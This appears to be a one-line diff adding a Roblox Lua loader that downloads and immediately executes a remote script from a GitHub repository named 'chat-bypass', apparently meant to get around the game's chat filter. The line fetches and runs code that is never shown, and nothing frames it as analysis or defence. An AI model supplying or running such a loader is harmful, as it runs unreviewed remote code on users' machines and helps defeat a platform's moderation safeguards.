@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c4shhh/chat-bypass/main/chat%20bypass"))()
